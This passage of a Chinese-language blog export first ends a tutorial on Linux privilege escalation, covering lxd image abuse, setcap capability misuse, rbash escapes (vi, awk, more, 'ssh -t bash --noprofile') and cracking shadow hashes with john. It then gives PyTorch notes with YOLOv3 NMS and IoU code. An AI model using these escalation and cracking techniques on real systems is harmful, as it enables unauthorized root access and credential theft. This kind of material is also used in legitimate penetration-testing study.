alt="image.png"><br>或者添加root帐号到passwd文件中。<br><img src="https://hexo-logseq.oss-cn-hangzhou.aliyuncs.com/image_1650117453337_0.png" alt="image.png"></p><blockquote><p>重点是一定是要有可交互终端的。</p></blockquote><h2 id="利用Lxd进行Linux提权"><a href="#利用Lxd进行Linux提权" class="headerlink" title="利用Lxd进行Linux提权"></a>利用Lxd进行Linux提权</h2><h3 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h3><p>lxc：系统容器，使进程之间相互隔离，进程虚拟化。<br>lxd：lxc有些缺点，例如不能进行容器迁移，管理比较复杂，所以进行了升级，即<code>lxd</code>，用来管理容器。<br>docker：<code>lxc</code>和<code>lxd</code>都是系统容器，而docker是应用程序容器。</p><h3 id="攻击机设置"><a href="#攻击机设置" class="headerlink" title="攻击机设置"></a>攻击机设置</h3><p>以Kali为例，首先需要下载<code>alpine</code>，然后进行build构建：<br><img src="https://hexo-logseq.oss-cn-hangzhou.aliyuncs.com/image_1650117875736_0.png" alt="image.png"><br>此时会生成一个<code>tar.gz</code>包，把该包传到目标机的tmp下。导入tmp后，将该映像添加到<code>lxd</code>中，添加后可通过<code>lxc image list</code>查看。<br><img src="https://hexo-logseq.oss-cn-hangzhou.aliyuncs.com/image_1650118052080_0.png" alt="image.png"><br>之后就可以进行提权操作。整体提权命令就4条：<br><img src="https://hexo-logseq.oss-cn-hangzhou.aliyuncs.com/image_1650118195622_0.png" alt="image.png"></p><h2 id="利用capability进行Linux提权"><a href="#利用capability进行Linux提权" class="headerlink" title="利用capability进行Linux提权"></a>利用capability进行Linux提权</h2><h3 id="介绍-1"><a href="#介绍-1" class="headerlink" title="介绍"></a>介绍</h3><p>capability类似于SUID，是用来让普通用户也可以做超级用户的工作，从而设置的一个机制，原来linux分的是普通用户和超级用户，后来加了capability，即赋予某某帐号能力，这个帐号有了能力就可以做事了。<br>capability可以分割root权限，把root特权分割成不同的能力，然后给与普通用户不同的能力：<br><img src="https://hexo-logseq.oss-cn-hangzhou.aliyuncs.com/image_1650118380300_0.png" alt="image.png"><br>多的很呢。<br>capability与SUID的缺别：SUID是针对某个用户，而capability是针对某个程序。<br>在设置程序能力时，有三个选项：</p><ol><li>inheritable，简称 i ，表示是否可继承</li><li>permitted，简称 p，表示是否允许使用</li><li>effective，简称 e，表示特权是否有效</li></ol><h4 id="setcap"><a href="#setcap" class="headerlink" title="setcap"></a>setcap</h4><p>setcap命令用来设置能力:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">setcap cap_setuid+ep /home/demo/python3</span><br></pre></td></tr></table></figure><p>表示为home&#x2F;demo&#x2F;python3这个程序添加了setuid能力，即改变进程uid的能力，+ep就表示能力有效，且允许使用。</p><h3 id="提权-2"><a href="#提权-2" class="headerlink" title="提权"></a>提权</h3><p>首先需要获取有能力的程序。setcap设置能力，getcat读取能力。getcap通过参数 r 来读取指定目录下有能力的程序<br><img src="https://hexo-logseq.oss-cn-hangzhou.aliyuncs.com/image_1650165849259_0.png" alt="image.png"><br>能力的滥用会导致提权，例如管理员要为python3程序设置超级权限给aaa用户，但是没有用suid或sudo授权，而是用capability：<br><img src="https://hexo-logseq.oss-cn-hangzhou.aliyuncs.com/image_1650166423922_0.png" alt="image.png"><br>因为root只想给aaa用户的python3能力，所以这里将程序复制到了aaa用户下，如果直接设置bin下的python3程序，那么意味着任何用户都具有了相关能力。<br>这时，获取了aaa账户，通过getcap命令发现python3具有setuid能力且属主和属于都是root。<br>那么提权就类似于SUID中的python提权方式。提权方式也是同理，其实就是类似于SUID的权限泄露。</p><h2 id="rbash绕过"><a href="#rbash绕过" class="headerlink" title="rbash绕过"></a>rbash绕过</h2><blockquote><p>确切的说不属于提权，只是绕过rbash的限制，因为绕过后身份依旧是当前的普通用户</p></blockquote><p>rbash是Restricted bash的缩写，即受限制的bash。管理员可以通过指定普通用户的bash为rbash，来限制相关操作。在rbash中，很多行为和命令都会收到限制。</p><h3 id="建立rbash"><a href="#建立rbash" class="headerlink" title="建立rbash"></a>建立rbash</h3><p><img src="https://hexo-logseq.oss-cn-hangzhou.aliyuncs.com/image_1650166456880_0.png" alt="image.png"><br>将用户aaa设置为rbash。</p><h3 id="vi绕过"><a href="#vi绕过" class="headerlink" title="vi绕过"></a>vi绕过</h3><p>可以进入vi中执行set命令将shell改为&#x2F;bin&#x2F;sh.<br><img src="https://hexo-logseq.oss-cn-hangzhou.aliyuncs.com/image_1650166480882_0.png" alt="image.png"></p><h3 id="ed绕过"><a href="#ed绕过" class="headerlink" title="ed绕过"></a>ed绕过</h3><p>文件编辑命令，类似于vi，也是内联编辑模式，可输入命令<br><img src="https://hexo-logseq.oss-cn-hangzhou.aliyuncs.com/image_1650166505547_0.png" alt="image.png"></p><h3 id="sh、bash、dash绕过"><a href="#sh、bash、dash绕过" class="headerlink" title="sh、bash、dash绕过"></a>sh、bash、dash绕过</h3><p>默认情况下，可以在rbash中执行，从而绕过rbash。如果这些命令不被允许，而cp被允许，可以把这些文件复制到当前目录运行，但是如果 &#x2F; 符号不被允许，那么是无法复制到当前目录的</p><blockquote><p>可以通过一系列可以执行的程序来绕过</p></blockquote><h3 id="awk绕过"><a href="#awk绕过" class="headerlink" title="awk绕过"></a>awk绕过</h3><p>awk命令通过BEGIN参数来指定执行前的语句：<br><img src="https://hexo-logseq.oss-cn-hangzhou.aliyuncs.com/image_1650166540554_0.png" alt="image.png"></p><h3 id="more绕过"><a href="#more绕过" class="headerlink" title="more绕过"></a>more绕过</h3><p>可以在more读取文件内容的时候，通过<code>!sh</code>来进入sh绕过rbash</p><h3 id="ssh绕过"><a href="#ssh绕过" class="headerlink" title="ssh绕过"></a>ssh绕过</h3><p>ssh可以通过 t 参数来强制分配给自己伪终端，指定强制分配给自己bash。然后指定noprofile参数，bash默认允许时会调用当前用户的bashrc等配置，该参数添加后，bash启动不会读取当前用户的默认配置</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh aaa@<span class="number">192.168</span><span class="number">.1</span><span class="number">.1</span> -t <span class="string">&quot;bash --noprofile&quot;</span></span><br></pre></td></tr></table></figure><h2 id="安全检测脚本"><a href="#安全检测脚本" class="headerlink" title="安全检测脚本"></a>安全检测脚本</h2><p><img src="https://hexo-logseq.oss-cn-hangzhou.aliyuncs.com/image_1650166591597_0.png" alt="image.png"></p><h1 id="漏洞提权"><a href="#漏洞提权" class="headerlink" title="漏洞提权"></a>漏洞提权</h1><blockquote><p>这可太“刑”了。</p></blockquote><p>一般情况下，建议先排查非漏洞提权方法，然后根据内核版本来查找相关的提权漏洞。<br>获取内核版本后，可以搜索该版本存在的漏洞，以下是常见的检测脚本：<br><img src="https://hexo-logseq.oss-cn-hangzhou.aliyuncs.com/image_1650166620888_0.png" alt="image.png"><br><a href="https://cxsecurity.com/">cxsecurity</a></p><h1 id="破解工具"><a href="#破解工具" class="headerlink" title="破解工具"></a>破解工具</h1><h2 id="john"><a href="#john" class="headerlink" title="john"></a>john</h2><p>获取shadow文件的加密信息进行破解，获取整行。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">john shadow # 针对一行信息</span><br></pre></td></tr></table></figure><p><img src="https://hexo-logseq.oss-cn-hangzhou.aliyuncs.com/image_1650093530605_0.png" alt="image.png"><br>当依据破解已经破解过的内容的时候，会显示<br><img src="https://hexo-logseq.oss-cn-hangzhou.aliyuncs.com/image_1650093576926_0.png" alt="image.png"><br>想要查看依据破解过的密码通过以下命令</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">john --show shadow # 就可以查看之前破解的结果</span><br></pre></td></tr></table></figure><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://www.bilibili.com/video/BV1QS4y1277a?spm_id_from=333.1007.top_right_bar_window_custom_collection.content.click">aFa攻防实验室</a></p>]]></content>
      
      
      <categories>
          
          <category> 防人之心不可无 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> black </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>pytorch</title>
      <link href="/2022/04/15/pytorch/"/>
      <url>/2022/04/15/pytorch/</url>
      
        <content type="html"><![CDATA[<h1 id="模型"><a href="#模型" class="headerlink" title="模型"></a>模型</h1><h2 id="ConvTranspose2d"><a href="#ConvTranspose2d" class="headerlink" title="ConvTranspose2d"></a>ConvTranspose2d</h2><p>id:: 6258d8b8-2557-4a01-ae49-cb96116dd746<br>逆卷积。<br>论文中称其为fractionally-strided convolutions，也有的称它为deconvolutions，但是前者表达更为确切。</p><h2 id="nn-AdaptiveAvgPool2d"><a href="#nn-AdaptiveAvgPool2d" class="headerlink" title="nn.AdaptiveAvgPool2d"></a>nn.AdaptiveAvgPool2d</h2><h3 id="2元-2d"><a href="#2元-2d" class="headerlink" title="2元(2d)"></a>2元(2d)</h3><p>就是二维数据的意思。</p><h3 id="汇聚层（Pooling）"><a href="#汇聚层（Pooling）" class="headerlink" title="汇聚层（Pooling）"></a>汇聚层（Pooling）</h3><p>汇聚层，有些地方也翻译成池化层，它主要负责对数据在空间维度（宽度和高度）上进行降采样（downsampling）操作</p><h3 id="均值（Avg）"><a href="#均值（Avg）" class="headerlink" title="均值（Avg）"></a>均值（Avg）</h3><p>均值（Avg）指定了汇聚层在进行降采样操作时所采用的计算方法。<br>汇聚层在降采样时，通常会使用<strong>最大值抽取样本和均值抽取样本</strong>两种手法。用最大值抽取样本的汇聚层一般叫做最大值汇聚层，用均值抽取样本的汇聚层一般叫做均值汇聚层。</p><h3 id="自适应-Adaptive"><a href="#自适应-Adaptive" class="headerlink" title="自适应(Adaptive)"></a>自适应(Adaptive)</h3><p>在实际的项目当中，我们往往预先只知道的是输入数据和输出数据的大小，而不知道核与步长的大小。如果使用上面的方法创建汇聚层，我们每次都需要手动计算核的大小和步长的值。而自适应（Adaptive）能让我们从这样的计算当中解脱出来，只要我们给定输入数据和输出数据的大小，自适应算法能够自动帮助我们计算核的大小和每次移动的步长。相当于我们对核说，我已经给你输入和输出的数据了，你自己适应去吧。你要长多大，你每次要走多远，都由你自己决定，总之最后你的输出符合我的要求就行了。</p><h3 id="nn-AvgPool2d"><a href="#nn-AvgPool2d" class="headerlink" title="nn.AvgPool2d"></a>nn.AvgPool2d</h3><p>需要至少指定kernel_size,stride，padding 三个参数，使用起来和卷积相似。最后的输出为<br><img src="https://hexo-logseq.oss-cn-hangzhou.aliyuncs.com/image_1649989945052_0.png" alt="image.png"><br><strong>AvgPool2d和AdaptiveAvgPool2d</strong>: 前者使用方法同卷积操作，而后者只需要指定输出图像的尺度，如HxW,或H（这时会默认为HxH）。</p><h2 id="Embedding"><a href="#Embedding" class="headerlink" title="Embedding"></a>Embedding</h2><h3 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">torch.nn.Embedding(num_embeddings, embedding_dim, padding_idx=<span class="literal">None</span>, max_norm=<span class="literal">None</span>, norm_type=<span class="number">2</span>, scale_grad_by_freq=<span class="literal">False</span>, sparse=<span class="literal">False</span>)</span><br></pre></td></tr></table></figure><p>num_embeddings：字典中词的个数<br>embedding_dim:嵌入的维度<br>padding_idx （索引指定填充）：如果给定，则遇到padding_idx中的索引，则将其位置填0（0是默认值，事实上随便填充什么值都可以）<br>max_norm:每一个嵌入矢量，它的norm如果大于max_norm将会被renormalized到max_norm<br>norm_type: the p of the p-norm to compute for the max_norm option.Default 2<br>scale_grad_by_freq: this will scale gradients by the inverse of frequence of the words in the min-batch .Default False<br>sparse:是否使用稀疏矩阵</p><blockquote><p>这个函数的作用就是词嵌入，避免了手工的词袋设计。</p></blockquote><p>🔥 embeddings中的值是正太分布N(0,1)中随机取值。</p><h3 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h3><h4 id="传统的使用方法"><a href="#传统的使用方法" class="headerlink" title="传统的使用方法"></a>传统的使用方法</h4><p><img src="https://hexo-logseq.oss-cn-hangzhou.aliyuncs.com/image_1649990056626_0.png" alt="image.png"></p><h4 id="在Sparse-R-CNN中用来嵌入框"><a href="#在Sparse-R-CNN中用来嵌入框" class="headerlink" title="在Sparse R-CNN中用来嵌入框"></a>在Sparse R-CNN中用来嵌入框</h4><p>将框作为嵌入信息使用，使用embeddings层的权重作为可能的位置关系来进行，通过clone权重作为参数，将字典功能的嵌入层变为了特征转换层。Sparse R-CNN&#x2F;projects&#x2F;SparseRCNN&#x2F;sparsercnn&#x2F;detector.py&#x2F;131</p><h2 id="传统的使用方法-1"><a href="#传统的使用方法-1" class="headerlink" title="传统的使用方法"></a>传统的使用方法</h2><h2 id="detach"><a href="#detach" class="headerlink" title="detach"></a><a href="https://mp.weixin.qq.com/s/_A5vA4Wn_aVQOeSOW2qAtg#">detach</a></h2><p>detach能够将数据从对应的网络中提取出来，能够阻断梯度回传。将一个变量从网络中分离出来，还是存放在原来的地方，只是将requires_grad设置为了False。</p><h2 id="NMS"><a href="#NMS" class="headerlink" title="NMS"></a><a href="https://github.com/ultralytics/yolov3/issues/679">NMS</a></h2><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p><img src="https://hexo-logseq.oss-cn-hangzhou.aliyuncs.com/image_1649990567860_0.png" alt="image.png"><br>这里以hard-nms为例：</p><ol><li>按类别进行遍历</li><li>选择当前类别中得分最高的框作为基准来进行nms操作</li><li>删除与基准iou超过阈值的候选框</li><li>从剩下的候选框中在选择最高得分的框作为一个新的基准重复操作</li></ol><h3 id="多种nms"><a href="#多种nms" class="headerlink" title="多种nms"></a>多种nms</h3><h4 id="Hard-nms"><a href="#Hard-nms" class="headerlink" title="Hard-nms"></a>Hard-nms</h4><p>直接删除相邻的同类别目标，密集目标的输出不友好。有多种不同的实现：</p><ol><li>or-nms: hard-nms的非官方实现形式，只支持cpu。</li><li>vision-nms: hard-nms的官方实现形式(c函数库)，可支持gpu（cuda），只支持单类别输入。</li><li>vision-batched-nms: hard-nms的官方实现形式(c函数库)，可支持gpu（cuda）,支持多类别输入。</li></ol><h4 id="Soft-nms"><a href="#Soft-nms" class="headerlink" title="Soft-nms"></a>Soft-nms</h4><p>hard-nms的官方实现形式(c函数库)，可支持gpu（cuda）,支持多类别输入。 [[soft-nms]]</p><h4 id="and-nms"><a href="#and-nms" class="headerlink" title="and-nms"></a>and-nms</h4><p>在hard-nms的逻辑基础上，增加是否为单独框的限制，删除没有重叠框的框（减少误检）。</p><h4 id="merge-nms"><a href="#merge-nms" class="headerlink" title="merge-nms"></a>merge-nms</h4><p>在hard-nms的逻辑基础上，增加是否为单独框的限制，删除没有重叠框的框（减少误检）。</p><h4 id="diou-nms"><a href="#diou-nms" class="headerlink" title="diou-nms"></a>diou-nms</h4><p>在hard-nms的基础上，用diou替换iou，里有参照diou的优势。</p><h3 id="CODE"><a href="#CODE" class="headerlink" title="CODE"></a>CODE</h3><h4 id="NMS-python实现"><a href="#NMS-python实现" class="headerlink" title="NMS python实现"></a>NMS python实现</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment"># method：可以选择使用哪种nms</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">non_max_suppression</span>(<span class="params">prediction, conf_thres=<span class="number">0.5</span>, nms_thres=<span class="number">0.5</span>, multi_cls=<span class="literal">True</span>, method=<span class="string">&#x27;vision&#x27;</span></span>):</span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">Removes detections with lower object confidence score than &#x27;conf_thres&#x27;</span></span><br><span class="line"><span class="string">Non-Maximum Suppression to further filter detections.</span></span><br><span class="line"><span class="string">Returns detections with shape:</span></span><br><span class="line"><span class="string">(x1, y1, x2, y2, object_conf, conf, class)</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># NMS methods https://github.com/ultralytics/yolov3/issues/679 &#x27;or&#x27;, &#x27;and&#x27;, &#x27;merge&#x27;, &#x27;vision&#x27;, &#x27;vision_batch&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Box constraints</span></span><br><span class="line">min_wh, max_wh = <span class="number">2</span>, <span class="number">4096</span>  <span class="comment"># (pixels) minimum and maximium box width and height</span></span><br><span class="line">output = [<span class="literal">None</span>] * <span class="built_in">len</span>(prediction)</span><br><span class="line"><span class="keyword">for</span> image_i, pred <span class="keyword">in</span> <span class="built_in">enumerate</span>(prediction):</span><br><span class="line"></span><br><span class="line"><span class="comment"># Apply conf constraint</span></span><br><span class="line">pred = pred[pred[:, <span class="number">4</span>] &gt; conf_thres]</span><br><span class="line"></span><br><span class="line"><span class="comment"># Apply width-height constraint</span></span><br><span class="line">pred = pred[(pred[:, <span class="number">2</span>:<span class="number">4</span>] &gt; min_wh).<span class="built_in">all</span>(<span class="number">1</span>) &amp; (pred[:, <span class="number">2</span>:<span class="number">4</span>] &lt; max_wh).<span class="built_in">all</span>(<span class="number">1</span>)]</span><br><span class="line"></span><br><span class="line"><span class="comment"># If none remain process next image</span></span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(pred) == <span class="number">0</span>:</span><br><span class="line"><span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Compute conf</span></span><br><span class="line">torch.sigmoid_(pred[..., <span class="number">5</span>:])</span><br><span class="line">pred[..., <span class="number">5</span>:] *= pred[..., <span class="number">4</span>:<span class="number">5</span>]  <span class="comment"># conf = obj_conf * cls_conf</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Box (center x, center y, width, height) to (x1, y1, x2, y2)</span></span><br><span class="line">box = xywh2xyxy(pred[:, :<span class="number">4</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment"># Detections matrix nx6 (xyxy, conf, cls)</span></span><br><span class="line"><span class="keyword">if</span> multi_cls <span class="keyword">or</span> conf_thres &lt; <span class="number">0.01</span>:</span><br><span class="line">i, j = (pred[:, <span class="number">5</span>:] &gt; conf_thres).nonzero().t()</span><br><span class="line">pred = torch.cat((box[i], pred[i, j + <span class="number">5</span>].unsqueeze(<span class="number">1</span>), j.<span class="built_in">float</span>().unsqueeze(<span class="number">1</span>)), <span class="number">1</span>)</span><br><span class="line"><span class="keyword">else</span>:  <span class="comment"># best class only</span></span><br><span class="line">conf, j = pred[:, <span class="number">5</span>:].<span class="built_in">max</span>(<span class="number">1</span>)</span><br><span class="line">pred = torch.cat((box, conf.unsqueeze(<span class="number">1</span>), j.<span class="built_in">float</span>().unsqueeze(<span class="number">1</span>)), <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Apply finite constraint</span></span><br><span class="line">pred = pred[torch.isfinite(pred).<span class="built_in">all</span>(<span class="number">1</span>)]</span><br><span class="line"></span><br><span class="line"><span class="comment"># Get detections sorted by decreasing confidence scores</span></span><br><span class="line">pred = pred[pred[:, <span class="number">4</span>].argsort(descending=<span class="literal">True</span>)]</span><br><span class="line"></span><br><span class="line"><span class="comment"># Batched NMS</span></span><br><span class="line"><span class="keyword">if</span> method == <span class="string">&#x27;vision_batch&#x27;</span>:</span><br><span class="line">output[image_i] = pred[torchvision.ops.boxes.batched_nms(pred[:, :<span class="number">4</span>], pred[:, <span class="number">4</span>], pred[:, <span class="number">5</span>], nms_thres)]</span><br><span class="line"><span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># All other NMS methods</span></span><br><span class="line">det_max = []</span><br><span class="line">cls = pred[:, -<span class="number">1</span>]</span><br><span class="line"><span class="keyword">for</span> c <span class="keyword">in</span> cls.unique():</span><br><span class="line">dc = pred[cls == c]  <span class="comment"># select class c</span></span><br><span class="line">n = <span class="built_in">len</span>(dc)</span><br><span class="line"><span class="keyword">if</span> n == <span class="number">1</span>:</span><br><span class="line">det_max.append(dc)  <span class="comment"># No NMS required if only 1 prediction</span></span><br><span class="line"><span class="keyword">continue</span></span><br><span class="line"><span class="keyword">elif</span> n &gt; <span class="number">500</span>:</span><br><span class="line">dc = dc[:<span class="number">500</span>]  <span class="comment"># limit to first 500 boxes: https://github.com/ultralytics/yolov3/issues/117</span></span><br><span class="line"><span class="keyword">if</span> method == <span class="string">&#x27;vision&#x27;</span>:</span><br><span class="line">det_max.append(dc[torchvision.ops.boxes.nms(dc[:, :<span class="number">4</span>], dc[:, <span class="number">4</span>], nms_thres)])</span><br><span class="line"><span class="keyword">elif</span> method == <span class="string">&#x27;or&#x27;</span>:  <span class="comment"># default</span></span><br><span class="line"><span class="keyword">while</span> dc.shape[<span class="number">0</span>]:</span><br><span class="line">det_max.append(dc[:<span class="number">1</span>])  <span class="comment"># save highest conf detection</span></span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(dc) == <span class="number">1</span>:  <span class="comment"># Stop if we&#x27;re at the last detection</span></span><br><span class="line"><span class="keyword">break</span></span><br><span class="line">iou = bbox_iou(dc[<span class="number">0</span>], dc[<span class="number">1</span>:])  <span class="comment"># iou with other boxes</span></span><br><span class="line">dc = dc[<span class="number">1</span>:][iou &lt; nms_thres]  <span class="comment"># remove ious &gt; threshold</span></span><br><span class="line"><span class="keyword">elif</span> method == <span class="string">&#x27;and&#x27;</span>:  <span class="comment"># requires overlap, single boxes erased</span></span><br><span class="line"><span class="keyword">while</span> <span class="built_in">len</span>(dc) &gt; <span class="number">1</span>:</span><br><span class="line">iou = bbox_iou(dc[<span class="number">0</span>], dc[<span class="number">1</span>:])  <span class="comment"># iou with other boxes</span></span><br><span class="line"><span class="keyword">if</span> iou.<span class="built_in">max</span>() &gt; <span class="number">0.5</span>:</span><br><span class="line">det_max.append(dc[:<span class="number">1</span>])</span><br><span class="line">dc = dc[<span class="number">1</span>:][iou &lt; nms_thres]  <span class="comment"># remove ious &gt; threshold</span></span><br><span class="line"><span class="keyword">elif</span> method == <span class="string">&#x27;merge&#x27;</span>:  <span class="comment"># weighted mixture box</span></span><br><span class="line"><span class="keyword">while</span> <span class="built_in">len</span>(dc):</span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(dc) == <span class="number">1</span>:</span><br><span class="line">det_max.append(dc)</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line">i = bbox_iou(dc[<span class="number">0</span>], dc) &gt; nms_thres  <span class="comment"># iou with other boxes</span></span><br><span class="line">weights = dc[i, <span class="number">4</span>:<span class="number">5</span>]</span><br><span class="line">dc[<span class="number">0</span>, :<span class="number">4</span>] = (weights * dc[i, :<span class="number">4</span>]).<span class="built_in">sum</span>(<span class="number">0</span>) / weights.<span class="built_in">sum</span>()</span><br><span class="line">det_max.append(dc[:<span class="number">1</span>])</span><br><span class="line">dc = dc[i == <span class="number">0</span>]</span><br><span class="line"><span class="keyword">elif</span> method == <span class="string">&#x27;diounms&#x27;</span>:  <span class="comment"># use diou </span></span><br><span class="line"><span class="keyword">while</span> dc.shape[<span class="number">0</span>]:</span><br><span class="line">det_max.append(dc[:<span class="number">1</span>])  <span class="comment"># save highest conf detection</span></span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(dc) == <span class="number">1</span>:  <span class="comment"># Stop if we&#x27;re at the last detection</span></span><br><span class="line"><span class="keyword">break</span></span><br><span class="line">diou = bbox_iou(dc[<span class="number">0</span>], dc[<span class="number">1</span>:]，DIoU=<span class="literal">True</span>)  <span class="comment"># diou with other boxes</span></span><br><span class="line">dc = dc[<span class="number">1</span>:][diou &lt; nms_thres]  <span class="comment"># remove dious &gt; threshold</span></span><br><span class="line"><span class="keyword">elif</span> method == <span class="string">&#x27;soft&#x27;</span>:  <span class="comment"># soft-NMS https://arxiv.org/abs/1704.04503</span></span><br><span class="line">sigma = <span class="number">0.5</span>  <span class="comment"># soft-nms sigma parameter</span></span><br><span class="line"><span class="keyword">while</span> <span class="built_in">len</span>(dc):</span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(dc) == <span class="number">1</span>:</span><br><span class="line">det_max.append(dc)</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line">det_max.append(dc[:<span class="number">1</span>])</span><br><span class="line">iou = bbox_iou(dc[<span class="number">0</span>], dc[<span class="number">1</span>:])  <span class="comment"># iou with other boxes</span></span><br><span class="line">dc = dc[<span class="number">1</span>:]</span><br><span class="line">dc[:, <span class="number">4</span>] *= torch.exp(-iou ** <span class="number">2</span> / sigma)  <span class="comment"># decay confidences</span></span><br><span class="line">dc = dc[dc[:, <span class="number">4</span>] &gt; conf_thres]  <span class="comment"># https://github.com/ultralytics/yolov3/issues/362</span></span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(det_max):</span><br><span class="line">det_max = torch.cat(det_max)  <span class="comment"># concatenate</span></span><br><span class="line">output[image_i] = det_max[(-det_max[:, <span class="number">4</span>]).argsort()]  <span class="comment"># sort</span></span><br><span class="line"><span class="keyword">return</span> output</span><br></pre></td></tr></table></figure><h4 id="IOU计算"><a href="#IOU计算" class="headerlink" title="IOU计算"></a>IOU计算</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">bbox_iou</span>(<span class="params">box1, box2, x1y1x2y2=<span class="literal">True</span>, GIoU=<span class="literal">False</span>, DIoU=<span class="literal">False</span>, CIoU=<span class="literal">False</span></span>):</span><br><span class="line"></span><br><span class="line"><span class="comment"># Returns the IoU of box1 to box2. box1 is 4, box2 is nx4</span></span><br><span class="line">box2 = box2.t()</span><br><span class="line"></span><br><span class="line"><span class="comment"># Get the coordinates of bounding boxes</span></span><br><span class="line"><span class="keyword">if</span> x1y1x2y2:  <span class="comment"># x1, y1, x2, y2 = box1</span></span><br><span class="line">b1_x1, b1_y1, b1_x2, b1_y2 = box1[<span class="number">0</span>], box1[<span class="number">1</span>], box1[<span class="number">2</span>], box1[<span class="number">3</span>]</span><br><span class="line">b2_x1, b2_y1, b2_x2, b2_y2 = box2[<span class="number">0</span>], box2[<span class="number">1</span>], box2[<span class="number">2</span>], box2[<span class="number">3</span>]</span><br><span class="line"><span class="keyword">else</span>:  <span class="comment"># x, y, w, h = 